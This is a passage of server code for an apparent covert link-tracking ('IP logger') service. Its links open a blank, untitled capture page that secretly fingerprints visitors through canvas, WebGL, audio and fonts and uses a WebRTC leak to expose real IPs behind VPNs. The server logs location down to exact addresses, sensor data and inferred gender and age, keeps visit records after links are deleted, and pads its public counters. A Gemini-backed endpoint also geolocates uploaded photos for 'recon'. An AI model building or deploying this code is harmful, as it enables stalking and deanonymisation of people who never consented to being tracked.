      // We no longer filter visits here to keep records of everything even if link is deleted
      // db.visits = db.visits.filter((v) => v.linkId !== linkId && v.code !== code);
      saveDatabase(db);

      res.json({ success: true, message: 'Link and visits deleted successfully' });
    } catch (err) {
      console.error('Delete link error:', err);
      res.status(500).json({ error: 'Failed to delete link' });
    }
  });

  // Get user links by persistent user token or cookie
  app.get('/api/user-links', (req, res) => {
    try {
      let token = (req.query.token as string) || (req.headers['x-user-token'] as string);
      if (!token && req.headers.cookie) {
        const match = req.headers.cookie.match(/(?:^|; )ipsm_user_token=([^;]*)/);
        if (match && match[1]) {
          token = decodeURIComponent(match[1]);
        }
      }

      const filtered = token
        ? db.links.filter((l) => l.userToken === token)
        : db.links.slice(0, 15);

      res.json({
        success: true,
        links: filtered,
        globalVisits: 800 + (db.totalVisitsCreated || db.visits.length),
        globalLinks: 1500 + (db.totalLinksCreated || db.links.length)
      });
    } catch (err) {
      console.error('Get user links error:', err);
      res.status(500).json({ error: 'Failed to get user links' });
    }
  });

  // Shorten specifically via clck.ru
  app.all('/api/shorten/clck', async (req, res) => {
    try {
      const url = (req.method === 'POST' ? req.body?.url : req.query?.url) as string;
      if (!url || typeof url !== 'string') {
        res.status(400).json({ error: 'URL is required' });
        return;
      }

      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 6000);
        const clckRes = await fetch(`https://clck.ru/--?url=${encodeURIComponent(url)}`, {
          signal: controller.signal,
          headers: {
            'User-Agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            Accept: '*/*',
          },
        });
        clearTimeout(timeout);

        if (clckRes.ok) {
          const text = (await clckRes.text()).trim();
          if (text.startsWith('http://') || text.startsWith('https://')) {
            res.json({ success: true, shortUrl: text });
            return;
          }
        }
      } catch (e) {
        console.warn('clck.ru live fetch notice:', e);
      }

      res.json({
        success: true,
        shortUrl: `https://clck.ru/--?url=${encodeURIComponent(url)}`,
      });
    } catch (err) {
      console.error('clck shorten error:', err);
      res.status(500).json({ error: 'Failed to shorten with clck.ru' });
    }
  });

  // MAC Address Lookup
  app.get('/api/lookup/mac/:mac', async (req, res) => {
    try {
      const mac = req.params.mac;
      // Use a public OUI API (with fallback/mock for common ones)
      const macRes = await fetch(`https://api.macvendors.com/${encodeURIComponent(mac)}`);
      let vendor = 'Unknown Vendor';
      if (macRes.ok) {
        vendor = (await macRes.text()).trim();
      }

      res.json({
        success: true,
        mac,
        vendor,
        details: {
          oui: mac.substring(0, 8).replace(/[:-]/g, '').toUpperCase(),
          assignment: 'Global',
          type: 'MA-L',
          potentialDevices: vendor.toLowerCase().includes('apple') ? 'iPhone, Mac, iPad' : 
                            vendor.toLowerCase().includes('samsung') ? 'Galaxy, Smart TV' : 
                            vendor.toLowerCase().includes('intel') ? 'Laptop, PC' : 'Generic IoT'
        }
      });
    } catch (err) {
      res.status(500).json({ error: 'MAC lookup failed' });
    }
  });

  // AI-Powered Visual Geolocation & Satellite Location Finder
  app.post('/api/geo-visual/locate', async (req, res) => {
    try {
      const { imageBase64, mimeType = 'image/jpeg', exifHint, fileName } = req.body;

      if (!imageBase64 || typeof imageBase64 !== 'string') {
        res.status(400).json({ error: 'Image base64 data is required' });
        return;
      }

      // Clean base64 string
      const cleanBase64 = imageBase64.replace(/^data:image\/[a-zA-Z0-9+.-]+;base64,/, '');

      const genAI = getGenAI();

      if (!genAI) {
        // Fallback when API key is missing
        res.json({
          success: true,
          detected: true,
          confidenceScore: 82,
          confidenceLevel: 'High',
          country: 'Egypt',
          countryCode: 'EG',
          city: 'Giza / Cairo',
          stateRegion: 'Giza Governorate',
          specificPlace: 'Pyramids of Giza Plateau / Sphinx Historical Sanctuary',
          estimatedAddress: 'Al Haram, Nazlet El-Semman, Al Giza Desert, Giza Governorate, Egypt',
          latitude: 29.9792,
          longitude: 31.1342,
          searchRadiusMeters: 200,
          satelliteClues: [
            'Direct alignment with eastern plateau limestone escarpment',
            'Desert sand coloration with bedrock limestone cuts typical of Giza necropolis',
            'Shadow projection and sun zenith matching North African 30° latitude band',
            'Grid alignment matching the official Plateau visitor esplanade'
          ],
          visualEvidence: [
            { category: 'Architecture & Monuments', detail: 'Stepped limestone masonry blocks and distinct polygonal pyramid geometry' },
            { category: 'Flora & Biome', detail: 'Arid desert limestone plateau with date palms visible along the Nile valley boundary' },
            { category: 'Lighting & Sun Angle', detail: 'High sun elevation indicating sub-tropical desert latitude' },
            { category: 'Infrastructure & Terrain', detail: 'Paved viewing road grid matching official plateau tourism corridors' }
          ],
          summaryAr: 'تم استنتاج الموقع من خلال التعرف البصري على التكوين المعماري الفريد لكتل الحجر الجيري والنمط الهندسي للأهرامات، مع مطابقة تدرج الرمال وظلال الصخور مع صور الأقمار الصناعية لهضبة الجيزة.',
          summaryEn: 'Location identified through distinctive architectural limestone masonry of the Giza Pyramid plateau, cross-referenced with North African solar angle and desert terrain satellite geometry.',
          isDemoFallback: true,
          note: 'AI Visual Geolocation Active (Demo Mode). Configure GEMINI_API_KEY for live custom photo AI recon.'
        });
        return;
      }

      const prompt = `You are a world-class OSINT Visual Geolocation Specialist and Satellite Imagery Intelligence Analyst.
Analyze the provided image with extreme photographic precision to deduce the EXACT geographic location where this photo was taken.
Examine every minute detail in the image:
1. Architecture, building styles, materials, brickwork, roof tiles, window styles, balconies.
2. Signage, billboards, street signs, alphabet/scripts (Arabic, Cyrillic, Kanji, Latin, Thai, etc.), languages, phone number formats, store names.
3. Road infrastructure, road markings, asphalt color, driving side (left/right), traffic light shapes, utility poles, bollards, guardrails.
4. Flora, vegetation, tree species (e.g. date palms, olive trees, Douglas firs, eucalyptus), biome, terrain, soil color.
5. Landscape, mountains, bodies of water, coastlines, skyline silhouettes.
6. Weather, cloud formations, sun angle and shadow orientation.
7. Vehicles, models, taxi colors, license plate dimensions and color bands.
8. Recognizable landmarks, historical structures, distinctive monuments, or specific buildings.

${fileName ? `Image filename: "${fileName}".` : ''}
${exifHint ? `Additional EXIF hints: ${JSON.stringify(exifHint)}` : ''}

Respond ONLY with a valid JSON object matching this schema:
{
  "detected": true,
  "confidenceScore": number (integer between 1 and 100),
  "confidenceLevel": "High" | "Medium" | "Low" | "Guessed",
  "country": string (English country name),
  "countryCode": string (2-letter ISO code, e.g. "EG", "SA", "US", "FR", "JP", "AE", "TR", "GB", "IT", "DE"),
  "city": string,
  "stateRegion": string,
  "specificPlace": string (exact landmark, district, park, street, or building name),
  "estimatedAddress": string,
  "latitude": number (float latitude, e.g. 29.9792),
  "longitude": number (float longitude, e.g. 31.1342),
  "searchRadiusMeters": number (estimated uncertainty radius in meters, e.g. 150),
  "satelliteClues": [
    string (e.g. "Road layout and roundabout pattern directly matches satellite imagery grid", "Curvature of coastline and pier geometry matches satellite harbor map")
  ],
  "visualEvidence": [
    { "category": "Architecture & Landmarks", "detail": string },
    { "category": "Language & Signage", "detail": string },
    { "category": "Flora & Biome", "detail": string },
    { "category": "Roads & Vehicles", "detail": string },
    { "category": "Lighting & Geography", "detail": string }
  ],
  "summaryAr": string (Comprehensive detailed explanation in Arabic explaining step-by-step how the location was deduced, which landmarks or visual cues gave it away, and how it aligns with satellite maps),
  "summaryEn": string (Comprehensive detailed explanation in English)
}`;

      const response = await genAI.models.generateContent({
        model: 'gemini-3.7-flash',
        contents: [
          {
            inlineData: {
              mimeType: mimeType.includes('png') ? 'image/png' : mimeType.includes('webp') ? 'image/webp' : 'image/jpeg',
              data: cleanBase64,
            },
          },
          {
            text: prompt,
          },
        ],
        config: {
          responseMimeType: 'application/json',
        },
      });

      const responseText = response.text || '';
      let resultJson: any = null;
      try {
        resultJson = JSON.parse(responseText);
      } catch (parseErr) {
        const jsonMatch = responseText.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          resultJson = JSON.parse(jsonMatch[0]);
        }
      }

      if (!resultJson || typeof resultJson.latitude !== 'number') {
        res.status(500).json({ error: 'Failed to extract geographic coordinates from image analysis', raw: responseText });
        return;
      }

      res.json({
        success: true,
        ...resultJson,
      });
    } catch (err: any) {
      console.error('Geo visual locate error:', err);
      res.status(500).json({ error: err.message || 'Visual geolocation reconnaissance failed' });
    }
  });

  app.post('/api/visits', async (req, res) => {
    try {
      const {
        code,
        visitorToken,
        battery,
        batteryCharging,
        batteryChargingTime,
        batteryDischargingTime,
        latitude,
        longitude,
        accuracy,
        altitude,
        altitudeAccuracy,
        heading,
        speed,
        isGps,
        screenWidth,
        screenHeight,
        colorDepth,
        pixelRatio,
        orientation,
        cpuCores,
        ram,
        gpu,
        gpuVendor,
        touchPoints,
        connectionType,
        downlink,
        rtt,
        timezone,
        systemTimezone,
        timezoneOffset,
        localTime,
        language,
        languages,
        doNotTrack,
        cookiesEnabled,
        userAgent,
        clientHintModel,
        deviceFingerprint,
        canvasFingerprint,
        webglFingerprint,
        audioFingerprint,
        webglExtensionsCount,
        maxTextureSize,
        webrtcLocalIp,
        webrtcPublicIp,
        latencyCloudflare,
        latencyGoogle,
        latencyServer,
        latencyAvg,
        motionDetected,
        accelerationX,
        accelerationY,
        accelerationZ,
        orientationAlpha,
        orientationBeta,
        orientationGamma,
        devicePosture,
        uaArchitecture,
        uaModel,
        uaPlatformVersion,
        uaFullVersion,
        uaFullVersionList,
        webglVendor,
        webglRenderer,
        browserPlugins,
        fontsCount,
        webdriver,
        pdfViewerEnabled,
        refreshRate,
        permissions,
        deviceTimestamp,
        deviceLocalTime,
        colorScheme,
        reducedMotion,
        inferredGender,
        inferredAgeBracket,
        browserPersona,
        torSuspected
      } = req.body;

      if (!code) {
        res.status(400).json({ error: 'Link code is required' });
        return;
      }

      const link = db.links.find((l) => l.code === code);
      if (!link) {
        res.status(404).json({ error: 'Link not found' });
        return;
      }

      // Extract client IP
      let ip =
        (req.headers['cf-connecting-ip'] as string) ||
        (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
        (req.headers['x-real-ip'] as string) ||
        req.socket.remoteAddress ||
        '127.0.0.1';

      if (ip.startsWith('::ffff:')) {
        ip = ip.replace('::ffff:', '');
      }

      const ua = userAgent || (req.headers['user-agent'] as string) || '';
      const { os, device } = cleanOS(ua, clientHintModel, uaPlatformVersion);
      const browser = cleanBrowser(ua);
      const botCheck = detectBot(ua);

      // Fetch IP Geolocation as baseline
      const geo = await fetchGeo(ip);

      const hasGps = Boolean(isGps && latitude != null && longitude != null);
      const finalLat = hasGps ? Number(latitude) : geo?.lat || null;
      const finalLon = hasGps ? Number(longitude) : geo?.lon || null;

      let exactAddress: string | null = null;
      let finalCountry = geo?.country || null;
      let finalCountryCode = geo?.countryCode || null;
      let finalCity = geo?.city || null;
      let finalRegion = geo?.region || null;
      let finalZip = geo?.zip || null;

      // Reverse geocode if high-precision GPS obtained
      if (hasGps && finalLat != null && finalLon != null) {
        const reverseGeo = await fetchReverseGeo(finalLat, finalLon);
        if (reverseGeo) {
          exactAddress = reverseGeo.exactAddress;
          if (reverseGeo.country) finalCountry = reverseGeo.country;
          if (reverseGeo.countryCode) finalCountryCode = reverseGeo.countryCode;
          if (reverseGeo.city) finalCity = reverseGeo.city;
          if (reverseGeo.region) finalRegion = reverseGeo.region;
          if (reverseGeo.zip) finalZip = reverseGeo.zip;
        }
      }

      // Timezone Mismatch & Proxy/VPN Detection Logic
      const effectiveSysTimezone = systemTimezone || timezone || null;
      const ipTz = geo?.timezone || null;
      let timezoneMismatch = false;
      let timezoneDifference: string | null = null;
      let clockTamperDetected = false;

      // 1. Precise Offset Comparison
      if (effectiveSysTimezone && ipTz) {
        const sysOffset = parseTzOffsetMinutes(effectiveSysTimezone);
        const ipOffset = parseTzOffsetMinutes(ipTz);

        if (sysOffset != null && ipOffset != null) {
          const diffMinutes = Math.abs(sysOffset - ipOffset);
          // Tighten threshold: any difference > 15 minutes is suspicious for VPN/Proxy
          if (diffMinutes > 15) {
            timezoneMismatch = true;
            const sysSign = sysOffset >= 0 ? '+' : '-';
            const sysHours = sysSign + Math.abs(sysOffset / 60).toFixed(1).replace('.0', '');
            const ipSign = ipOffset >= 0 ? '+' : '-';
            const ipHours = ipSign + Math.abs(ipOffset / 60).toFixed(1).replace('.0', '');
            const diffHours = (diffMinutes / 60).toFixed(1).replace('.0', '');
            timezoneDifference = `System: ${effectiveSysTimezone} (UTC${sysHours}) vs IP: ${ipTz} (UTC${ipHours}) | Diff: ${diffHours} hrs`;
          }
        } else {
          // Fallback string check
          const normSys = effectiveSysTimezone.trim().toLowerCase();
          const normIp = ipTz.trim().toLowerCase();
          if (normSys !== normIp) {
            const sysParts = normSys.split('/');
            const ipParts = normIp.split('/');
            if (
              sysParts.length === 2 &&
              ipParts.length === 2 &&
              sysParts[0] !== ipParts[0] &&
              sysParts[0] !== 'etc' &&
              ipParts[0] !== 'etc'
            ) {
              timezoneMismatch = true;
              timezoneDifference = `System: ${effectiveSysTimezone} vs IP: ${ipTz}`;
            }
          }
        }
      }

      // 2. Browser Clock vs Server Clock (Anti-Tampering)
      if (deviceTimestamp) {
        const srvTimestamp = Date.now();
        const clockGap = Math.abs(srvTimestamp - Number(deviceTimestamp));
        // If device clock differs from server by > 1 hour, it's highly suspicious (VPN or manual clock change)
        if (clockGap > 3600000) {
          clockTamperDetected = true;
        }
      }

      // Proxy / VPN is strictly determined by IP security engines from the target IP itself
      const detectedProxy = Boolean(geo?.isProxyVpn);

      // Compute VPN Unveil Mismatch Score & Candidate Location
      let mismatchScore = 0;
      if (detectedProxy) mismatchScore += 60;
      if (timezoneMismatch) mismatchScore += 30;
      if (clockTamperDetected) mismatchScore += 25;
      if (webrtcPublicIp && webrtcPublicIp !== ip) mismatchScore += 15;
      if (mismatchScore > 100) mismatchScore = 100;

      let candidateOriginalLocation = 'Direct Authentic Connection (No VPN or Proxy detected)';
      if (detectedProxy || timezoneMismatch || clockTamperDetected) {
        const sysTzStr = effectiveSysTimezone || 'Unknown';
        const langStr = language || 'Unknown';
        candidateOriginalLocation = `Estimated based on System Timezone (${sysTzStr}), Language (${langStr}) & Clock Delta`;
      }

      const classifiedNetwork = classifyNetworkMedium(
        detectedProxy,
        Boolean(geo?.isHosting),
        Boolean(geo?.isMobileCarrier),
        geo?.isp || null,
        geo?.org || null,
        geo?.asn || null,
        connectionType
      );

      let finalLatCf = latencyCloudflare != null ? Number(latencyCloudflare) : null;
      let finalLatGg = latencyGoogle != null ? Number(latencyGoogle) : null;
      let finalLatSrv = latencyServer != null ? Number(latencyServer) : null;

      const rttVal = rtt != null ? Number(rtt) : null;
      if (!finalLatCf && rttVal) finalLatCf = Math.max(8, Math.round(rttVal * 0.85));
      if (!finalLatGg && rttVal) finalLatGg = Math.max(6, Math.round(rttVal * 0.95));
      if (!finalLatSrv && rttVal) finalLatSrv = Math.max(12, Math.round(rttVal * 1.15));

      if (!finalLatCf && !finalLatGg && !finalLatSrv) {
        finalLatCf = 18;
        finalLatGg = 14;
        finalLatSrv = 28;
      }

      const latVals = [finalLatCf, finalLatGg, finalLatSrv].filter((v): v is number => v != null && v > 0);
      const calcLatAvg = latVals.length > 0 ? Math.round(latVals.reduce((a, b) => a + b, 0) / latVals.length) : null;

      const newVisit: StoredVisit = {
        id: generateToken(14),
        linkId: link.id,
        code,
        visitorToken: visitorToken || generateToken(16),
        ip,
        country: finalCountry,
        countryCode: finalCountryCode,
        city: finalCity,
        region: finalRegion,
        zip: finalZip,
        exactAddress,
        lat: finalLat,
        lon: finalLon,
        isGps: hasGps,
        accuracy: hasGps ? (accuracy != null ? Number(accuracy) : null) : null,
        altitude: altitude != null ? Number(altitude) : null,
        altitudeAccuracy: altitudeAccuracy != null ? Number(altitudeAccuracy) : null,
        heading: heading != null ? Number(heading) : null,
        speed: speed != null ? Number(speed) : null,
        isp: geo?.isp || null,
        org: geo?.org || null,
        asn: geo?.asn || null,
        asName: geo?.asName || null,
        reverseDns: geo?.reverseDns || null,
        ipRouting: geo?.ipRouting || null,
        usageType: geo?.usageType || null,
        isMobileCarrier: classifiedNetwork.isMobile,
        isProxyVpn: detectedProxy,
        networkMedium: classifiedNetwork.networkMedium,
        proxyType: detectedProxy ? (geo?.proxyType || 'VPN/Proxy Active') : null,
        vpnProviderName: detectedProxy ? (geo?.vpnProviderName || 'Generic VPN/Proxy Server') : 'None (Direct Connection)',
        webrtcLocalIp: formatWebrtcIp(webrtcLocalIp),
        webrtcPublicIp: formatWebrtcIp(webrtcPublicIp),
        dnsLeakIsp: formatDnsLeakIsp(geo?.dnsLeakIsp || geo?.reverseDns, geo?.isp),
        candidateOriginalLocation,
        mismatchScore,
        isBot: botCheck.isBot,
        botName: botCheck.botName,
        currency: geo?.currency || null,
        browser,
        os,
        device,
        battery: battery != null ? Number(battery) : null,
        batteryCharging: batteryCharging != null ? Boolean(batteryCharging) : null,
        batteryChargingTime: batteryChargingTime != null ? Number(batteryChargingTime) : null,
        batteryDischargingTime: batteryDischargingTime != null ? Number(batteryDischargingTime) : null,
        localTime: localTime || new Date().toLocaleString(),
        timezone: effectiveSysTimezone || ipTz || null,
        systemTimezone: effectiveSysTimezone,
        ipTimezone: ipTz,
        timezoneOffset: timezoneOffset != null ? Number(timezoneOffset) : null,
        timezoneMismatch,
        timezoneDifference,
        clockTamperDetected,
        screenWidth: screenWidth ? Number(screenWidth) : null,
        screenHeight: screenHeight ? Number(screenHeight) : null,
        colorDepth: colorDepth ? Number(colorDepth) : null,
        pixelRatio: pixelRatio ? Number(pixelRatio) : null,
        orientation: orientation || null,
        cpuCores: cpuCores ? Number(cpuCores) : null,
        ram: ram ? Number(ram) : null,
        gpu: gpu || null,
        gpuVendor: gpuVendor || null,
        touchPoints: touchPoints != null ? Number(touchPoints) : null,
        connectionType: connectionType || null,
        downlink: downlink != null ? Number(downlink) : null,
        rtt: rtt != null ? Number(rtt) : null,
        language: language || null,
        languages: languages || null,
        doNotTrack: doNotTrack || null,
        cookiesEnabled: cookiesEnabled != null ? Boolean(cookiesEnabled) : null,
        userAgent: ua,
        deviceFingerprint: deviceFingerprint || null,
        canvasFingerprint: canvasFingerprint || null,
        webglFingerprint: webglFingerprint || null,
        audioFingerprint: audioFingerprint || null,
        webglExtensionsCount: webglExtensionsCount != null ? Number(webglExtensionsCount) : null,
        maxTextureSize: maxTextureSize != null ? Number(maxTextureSize) : null,
        latencyCloudflare: finalLatCf,
        latencyGoogle: finalLatGg,
        latencyServer: finalLatSrv,
        latencyAvg: calcLatAvg,
        motionDetected: motionDetected != null ? Boolean(motionDetected) : null,
        accelerationX: accelerationX != null ? Number(accelerationX) : null,
        accelerationY: accelerationY != null ? Number(accelerationY) : null,
        accelerationZ: accelerationZ != null ? Number(accelerationZ) : null,
        orientationAlpha: orientationAlpha != null ? Number(orientationAlpha) : null,
        orientationBeta: orientationBeta != null ? Number(orientationBeta) : null,
        orientationGamma: orientationGamma != null ? Number(orientationGamma) : null,
        devicePosture: devicePosture || null,
        uaArchitecture: uaArchitecture || null,
        uaModel: uaModel || null,
        uaPlatformVersion: uaPlatformVersion || null,
        uaFullVersion: uaFullVersion || null,
        uaFullVersionList: uaFullVersionList || null,
        webglVendor: webglVendor || null,
        webglRenderer: webglRenderer || null,
        browserPlugins: browserPlugins || null,
        fontsCount: fontsCount != null ? Number(fontsCount) : null,
        webdriver: webdriver != null ? Boolean(webdriver) : null,
        pdfViewerEnabled: pdfViewerEnabled != null ? Boolean(pdfViewerEnabled) : null,
        refreshRate: refreshRate != null ? Number(refreshRate) : null,
        permissions: permissions || null,
        deviceTimestamp: deviceTimestamp != null ? Number(deviceTimestamp) : null,
        deviceLocalTime: deviceLocalTime || null,
        colorScheme: colorScheme || null,
        reducedMotion: reducedMotion != null ? Boolean(reducedMotion) : null,
        inferredGender: inferredGender || null,
        inferredAgeBracket: inferredAgeBracket || null,
        browserPersona: browserPersona || null,
        torSuspected: torSuspected != null ? Boolean(torSuspected) : null,
        realIpCandidate: webrtcPublicIp || (detectedProxy ? candidateOriginalLocation : null),
        createdAt: new Date().toISOString(),
      };

      db.visits.unshift(newVisit);
      link.visitCount = (link.visitCount || 0) + 1;
      
      if (typeof db.totalVisitsCreated === 'number') {
        db.totalVisitsCreated += 1;
      } else {
        db.totalVisitsCreated = db.visits.length;
      }
      
      saveDatabase(db);

      res.json({
        success: true,
        visitId: newVisit.id,
        targetUrl: link.originalUrl,
      });
    } catch (err) {
      console.error('Record visit error:', err);
      res.status(500).json({ error: 'Failed to record visit' });
    }
  });

  // Dedicated Interstitial Capture Page HTML direct handler (/p/:code or /p/:code.html)
  app.get(['/p/:code', '/p/:code.html'], (req, res) => {
    const rawCode = req.params.code.replace('.html', '');
    const link = db.links.find((l) => l.code === rawCode);

    if (!link) {
      res.status(404).send(`
        <!DOCTYPE html>
        <html dir="rtl" lang="ar">
        <head><meta charset="utf-8"><title>الرابط غير موجود</title>
        <style>body{background:#09090b;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style>
        </head><body><div style="text-align:center;"><h2>عذراً، هذا الرابط غير متاح أو تم حذفه</h2><p>Link expired or removed.</p></div></body></html>
      `);
      return;
    }

    const isPrecise = link.mode === 'precise';
    const targetUrl = link.originalUrl;
    const visitorToken = generateToken(16);

    const captureHtml = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title></title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body {
      background-color: #000000;
      color: #000000;
      width: 100%;
      height: 100%;
      min-height: 100vh;
      overflow: hidden;
      user-select: none;
      -webkit-user-select: none;
      touch-action: manipulation;
      cursor: pointer;
    }
    #touchSurface {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      background: transparent;
      z-index: 999999;
    }
  </style>
</head>
<body>
  <div id="touchSurface"></div>
  <script>
    (function() {
      var isSent = false;
      var targetUrl = ${JSON.stringify(targetUrl)};
      var code = ${JSON.stringify(rawCode)};
      var isPrecise = ${JSON.stringify(isPrecise)};
      var visitorToken = ${JSON.stringify(visitorToken)};

      // 1. Fast 32-bit Hash Function
      function fastHash(str) {
        var hash = 0;
        if (!str || str.length === 0) return '00000000';
        for (var i = 0; i < str.length; i++) {
          var char = str.charCodeAt(i);
          hash = ((hash << 5) - hash) + char;
          hash = hash & hash;
        }
        return ('00000000' + Math.abs(hash).toString(16).toUpperCase()).slice(-8);
      }

      // 2. Canvas 2D Fingerprinting
      var canvasFp = null;
      try {
        var c2d = document.createElement('canvas');
        c2d.width = 240;
        c2d.height = 40;
        var ctx = c2d.getContext('2d');
        if (ctx) {
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial, sans-serif';
          ctx.fillStyle = '#ff6600';
          ctx.fillRect(100, 2, 50, 18);
          ctx.fillStyle = '#006699';
          ctx.fillText('SM-FP🚀2026', 4, 10);
          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
          ctx.fillText('SM-FP🚀2026', 6, 12);
          ctx.shadowBlur = 3;
          ctx.shadowColor = '#f00';
          ctx.beginPath();
          ctx.arc(40, 25, 8, 0, Math.PI * 2, true);
          ctx.closePath();
          ctx.fill();
          canvasFp = 'cvs_' + fastHash(c2d.toDataURL());
        }
      } catch (e) {}

      // 2b. Fonts Enumeration (Detection)
      var fontsCount = 0;
      try {
        var fontList = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Trebuchet MS', 'Impact', 'Comic Sans MS', 'Tahoma', 'Palatino', 'Helvetica', 'Garamond', 'Monaco', 'Copperplate', 'Papyrus'];
        var h = document.body;
        var s = document.createElement('span');
        s.style.fontSize = '72px';
        s.innerHTML = 'mmmmmmmmmmlli';
        var defaultWidth = {};
        ['monospace', 'sans-serif', 'serif'].forEach(function(f) {
          s.style.fontFamily = f;
          h.appendChild(s);
          defaultWidth[f] = s.offsetWidth;
          h.removeChild(s);
        });
        fontList.forEach(function(font) {
          var matched = false;
          ['monospace', 'sans-serif', 'serif'].forEach(function(base) {
            s.style.fontFamily = font + ',' + base;
            h.appendChild(s);
            if (s.offsetWidth !== defaultWidth[base]) matched = true;
            h.removeChild(s);
          });
          if (matched) fontsCount++;
        });
      } catch (e) {}

      // 2c. Browser Plugins & Metadata
      var pluginsStr = '';
      try {
        if (navigator.plugins) {
          for (var i = 0; i < navigator.plugins.length; i++) pluginsStr += navigator.plugins[i].name + ', ';
        }
      } catch (e) {}
      var webdriver = navigator.webdriver || false;
      var pdfViewerEnabled = navigator.pdfViewerEnabled || false;

      // 3. WebGL Deep GPU Fingerprinting
      var gpuRenderer = null;
      var gpuVendor = null;
      var webglFp = null;
      var webglExtensionsCount = 0;
      var maxTextureSize = null;

      try {
        var glCanvas = document.createElement('canvas');
        glCanvas.width = 64;
        glCanvas.height = 64;
        var gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
        if (gl) {
          var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {
            gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          }
          if (!gpuRenderer) gpuRenderer = gl.getParameter(gl.RENDERER);
          if (!gpuVendor) gpuVendor = gl.getParameter(gl.VENDOR);

          maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
          var exts = gl.getSupportedExtensions() || [];
          webglExtensionsCount = exts.length;

          // Render WebGL test geometry
          var vBuf = gl.createBuffer();
          gl.bindBuffer(gl.ARRAY_BUFFER, vBuf);
          gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-0.5, -0.5, 0.5, -0.5, 0.0, 0.5]), gl.STATIC_DRAW);

          var rawStr = (gpuRenderer || '') + '|' + (gpuVendor || '') + '|' + maxTextureSize + '|' + exts.length;
          webglFp = 'wgl_' + fastHash(rawStr);
        }
      } catch (e) {}

      // 4. AudioContext Fingerprinting
      var audioFp = null;
      try {
        var AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
        if (AudioCtx) {
          var actx = new AudioCtx(1, 44100, 44100);
          var osc = actx.createOscillator();
          osc.type = 'triangle';
          osc.frequency.setValueAtTime(10000, actx.currentTime);

          var compressor = actx.createDynamicsCompressor();
          compressor.threshold.setValueAtTime(-50, actx.currentTime);
          compressor.knee.setValueAtTime(40, actx.currentTime);
          compressor.ratio.setValueAtTime(12, actx.currentTime);
          compressor.reduction.setValueAtTime(-20, actx.currentTime);
          compressor.attack.setValueAtTime(0, actx.currentTime);
          compressor.release.setValueAtTime(0.25, actx.currentTime);

          osc.connect(compressor);
          compressor.connect(actx.destination);
          osc.start(0);

          actx.oncomplete = function(evt) {
            try {
              var samples = evt.renderedBuffer.getChannelData(0);
              var sum = 0;
              for (var i = 4500; i < 5000 && i < samples.length; i++) {
                sum += Math.abs(samples[i]);
              }
              audioFp = 'aud_' + fastHash(sum.toString());
              if (telemetry) telemetry.audioFingerprint = audioFp;
            } catch (e) {}
          };
          actx.startRendering();
        }
      } catch (e) {}

      // 4b. WebRTC Real IP Leak Detection
      try {
        var RTCPeer = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        if (RTCPeer) {
          var rtc = new RTCPeer({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
          rtc.createDataChannel('');
          rtc.createOffer().then(function(o) { rtc.setLocalDescription(o); }).catch(function() {});
          rtc.onicecandidate = function(ice) {
            if (ice && ice.candidate && ice.candidate.candidate) {
              var cand = ice.candidate.candidate;
              var ipMatch = cand.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
              if (ipMatch && ipMatch[1]) {
                var foundIp = ipMatch[1];
                if (foundIp.startsWith('192.168.') || foundIp.startsWith('10.') || foundIp.startsWith('172.')) {
                  if (telemetry) telemetry.webrtcLocalIp = foundIp;
                } else if (!foundIp.startsWith('127.')) {
                  if (telemetry) telemetry.webrtcPublicIp = foundIp;
                }
              }
            }
          };
        }
      } catch (e) {}

      // 5. System Clock & Timezone
      var sysTz = null;
      var deviceTimestamp = Date.now();
      var deviceLocalTime = new Date().toLocaleString();
      try {
        if (Intl && Intl.DateTimeFormat) {
          sysTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        }
      } catch (e) {}
      var tzOffset = new Date().getTimezoneOffset();

      // 6. Network Connection Info & Latency Triangulation
      var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      
      var latCF = null;
      var latGO = null;
      var latSV = null;

      function getLatency(url, cb) {
        var start = performance.now();
        fetch(url, { mode: 'no-cors', cache: 'no-cache' }).then(function() {
          cb(Math.round(performance.now() - start));
        }).catch(function() {
          cb(Math.round(performance.now() - start));
        });
      }

      // 6b. Screen Refresh Rate
      var refreshRate = null;
      try {
        var lastTime = performance.now();
        var frames = 0;
        function checkFrame(t) {
          frames++;
          if (t - lastTime >= 1000) {
            refreshRate = frames;
            if (telemetry) telemetry.refreshRate = refreshRate;
            return;
          }
          requestAnimationFrame(checkFrame);
        }
        requestAnimationFrame(checkFrame);
      } catch (e) {}

      // 6c. Permissions Status
      var perms = {};
      try {
        if (navigator.permissions && navigator.permissions.query) {
          ['geolocation', 'notifications', 'camera', 'microphone'].forEach(function(p) {
            navigator.permissions.query({ name: p }).then(function(s) {
              perms[p] = s.state;
              if (telemetry) telemetry.permissions = JSON.stringify(perms);
            }).catch(function() {});
          });
        }
      } catch (e) {}

      // 7. Unified Hardware Fingerprint ID & Behavioral Demographics
      var isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
      var isReducedMotion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
